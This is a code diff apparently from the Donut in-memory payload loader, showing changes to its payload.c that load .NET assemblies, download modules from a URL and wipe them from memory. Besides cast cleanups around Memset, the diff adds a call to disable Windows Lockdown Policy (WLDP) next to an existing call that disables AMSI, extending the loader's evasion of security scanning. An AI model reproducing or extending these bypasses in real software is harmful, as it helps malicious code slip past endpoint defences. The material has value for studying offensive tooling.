@@ -31,18 +31,13 @@
 
 #include "payload.h"
 
-#if defined(_MSC_VER)
-#pragma intrinsic(memset)
-#define Memset(x,y,z) __stosb(x,y,z)
-#endif
-
 DWORD ThreadProc(LPVOID lpParameter) {
     ULONG               i, ofs;
     ULONG64             sig;
     PDONUT_INSTANCE     inst = (PDONUT_INSTANCE)lpParameter;
     DONUT_ASSEMBLY      assembly;
     
-    Memset((PBYTE)&assembly, 0, sizeof(assembly));
+    Memset(&assembly, 0, sizeof(assembly));
     
 #if !defined(NOCRYPTO)
     PBYTE           inst_data;
@@ -100,7 +95,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     FreeAssembly(inst, &assembly);
     
     // clear instance from memory
-    Memset((PBYTE)inst, 0, inst->len);
+    Memset(inst, 0, inst->len);
     
     return 0;
 }
@@ -112,7 +107,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     SAFEARRAYBOUND  sab;
     SAFEARRAY       *sa;
     DWORD           i;
-    BOOL            loaded=FALSE, loadable, amsi;
+    BOOL            loaded=FALSE, loadable, disabled;
     PBYTE           p;
     HMODULE         hAMSI;
     
@@ -196,9 +191,13 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
           
         if(SUCCEEDED(hr)) {
           // Try to disable AMSI
-          amsi = DisableAMSI(inst);
-          DPRINT("DisableAMSI %s", amsi ? "OK" : "FAILED");
+          disabled = DisableAMSI(inst);
+          DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
             
+          // Try to disable WLDP
+          disabled = DisableWLDP(inst);
+          DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
+          
           sab.lLbound   = 0;
           sab.cElements = mod->len;
           sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
@@ -392,7 +391,7 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     if(inst->type == DONUT_INSTANCE_URL) {
       if(inst->module.p != NULL) {
         // overwrite with zeros
-        Memset((PBYTE)inst->module.p, 0, (DWORD)inst->mod_len);
+        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
         
         // free memory
         inst->api.VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
@@ -476,7 +475,7 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
                   INTERNET_FLAG_RELOAD            |
                   INTERNET_FLAG_NO_AUTO_REDIRECT;
     
-    Memset((void*)&uc, 0, sizeof(uc));
+    Memset(&uc, 0, sizeof(uc));
     
     uc.dwStructSize     = sizeof(uc);
     uc.lpszHostName     = host;
